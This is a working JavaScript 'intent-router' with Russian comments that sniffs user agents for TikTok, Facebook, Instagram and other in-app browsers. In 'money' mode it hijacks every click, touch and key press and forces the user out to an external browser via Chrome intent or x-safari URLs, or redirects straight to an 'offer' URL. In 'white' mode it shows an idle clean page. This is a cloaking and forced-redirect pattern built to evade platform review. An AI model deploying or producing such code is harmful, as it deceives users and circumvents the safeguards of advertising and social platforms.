(function () {
  'use strict';

  var cfg   = window.IntentBypassConfig || {};
  var PAGE  = (cfg.page || '').toLowerCase();
  var DEBUG = !!cfg.debug;

  function log() {
    if (DEBUG && window.console && console.log) {
      console.log.apply(console, ['[intent-router]'].concat([].slice.call(arguments)));
    }
  }

  function UA() {
    return (navigator.userAgent || navigator.vendor || '').toLowerCase();
  }

  function isAndroid()   { return /android/.test(UA()); }
  function isIOS()       { return /(iphone|ipad|ipod|ios)/.test(UA()); }
  function isChromeLike(){ return /(chrome|crios)/.test(UA()); }

  
  function isInAppWebView() {
    var u = UA();
    var hasWV   = u.includes(' wv') || u.includes('; wv)');
    var isTT    = /tiktok|musical_ly|ttwebview|bytedance|aweme/.test(u);
    var isFBIG  = /fban|fbav|fb_iab|instagram|igapp|messenger/.test(u);
    var isOther = /line\/|wechat|snapchat|pinterest/.test(u);
    return hasWV || isTT || isFBIG || isOther;
  }

  function normUrl(u) {
    if (!u) return '';
    var s = String(u).trim();
    if (!s) return '';
    try {
      return new URL(s, location.href).href;
    } catch (_) {
      return s;
    }
  }

  var OFFER_TARGET = normUrl(cfg.intentTarget) || '';
  var CLEAN_TARGET = normUrl(cfg.cleanTarget)  || OFFER_TARGET || '';

 

  function buildChromeIntent(targetUrl, fallbackUrl) {
    var t = normUrl(targetUrl);
    if (!t) return '';
    var f = normUrl(fallbackUrl || targetUrl) || t;
    // Классический intent формат
    return 'intent://navigate?url=' + encodeURIComponent(t) +
           '#Intent;scheme=googlechrome;package=com.android.chrome;' +
           'S.browser_fallback_url=' + encodeURIComponent(f) + ';end;';
  }

  function buildXSafari(targetUrl) {
    var t = normUrl(targetUrl);
    if (!t) return '';
    return 'x-safari-https://' + t.replace(/^https?:\/\//i, '');
  }

  function openExternalViaIntent(targetUrl) {
    var t = normUrl(targetUrl);
    if (!t) {
      log('openExternalViaIntent: empty target, skip');
      return;
    }

    var finalUrl;

    if (isAndroid() && isChromeLike()) {
      finalUrl = buildChromeIntent(t, t);
    } else if (isIOS()) {
      finalUrl = buildXSafari(t);
    } else {
     
      finalUrl = t;
    }

    log('openExternalViaIntent:', finalUrl);

    try {
      var w = window.open(finalUrl, '_blank');
      log('window.open result:', w);
      
      if (!w && finalUrl !== t) {
        location.href = t;
      }
    } catch (e) {
      log('openExternalViaIntent error:', e);
      try {
        location.href = t;
      } catch (_) {
        location.assign(t);
      }
    }
  }

  
  function redirectNormally(targetUrl) {
    var t = normUrl(targetUrl);
    if (!t) {
      log('redirectNormally: empty target, skip');
      return;
    }
    log('redirectNormally ->', t);
    try {
      location.href = t;
    } catch (e) {
      location.assign(t);
    }
  }

  

  function initWhite(inApp) {
    if (!inApp) {
     
      log('WHITE: normal browser, idle.');
      return;
    }

    
    var selfTarget = OFFER_TARGET || CLEAN_TARGET || location.href;
    log('WHITE: in WebView, auto intent to self:', selfTarget);
    openExternalViaIntent(selfTarget);
  }



  function initMoney(inApp) {
    var offer = OFFER_TARGET || CLEAN_TARGET;

    if (!offer) {
      log('MONEY: no offer target configured, idle.');
      return;
    }

    if (!inApp) {
     
      log('MONEY: normal browser, auto redirect to offer.');
      redirectNormally(offer);
      return;
    }

    
    log('MONEY: in WebView, bind all actions -> intent(current URL).');

    function handler(ev) {
      try {
        ev.preventDefault && ev.preventDefault();
        ev.stopPropagation && ev.stopPropagation();
      } catch (_) {}
      
      var currentUrl = location.href;
      log('MONEY WebView event:', ev.type, '-> intent(currentUrl=', currentUrl, ')');
      openExternalViaIntent(currentUrl);
    }

    var optsPassiveFalse = { passive: false, capture: true };
    var optsPassiveTrue  = { passive: true,  capture: true };

    document.addEventListener('click',       handler, optsPassiveTrue);
    document.addEventListener('pointerdown', handler, optsPassiveTrue);
    document.addEventListener('touchstart',  handler, optsPassiveFalse);
    document.addEventListener('keydown', function (e) {
      if (e.key === 'Enter' || e.key === ' ') handler(e);
    }, true);
  }


  function boot() {
    var inApp = isInAppWebView();
    var pageType = (PAGE === 'money') ? 'money' : 'white';

    log('boot:', { pageType: pageType, inApp: inApp, ua: UA() });

    if (pageType === 'money') {
      initMoney(inApp);
    } else {
     
      initWhite(inApp);
    }
  }

  if (document.readyState === 'complete' || document.readyState === 'interactive') {
    boot();
  } else {
    document.addEventListener('DOMContentLoaded', boot);
  }

  // Для дебага в консоли
  window.__intentRouter = {
    cfg: cfg,
    isInAppWebView: isInAppWebView,
    UA: UA
  };
})();
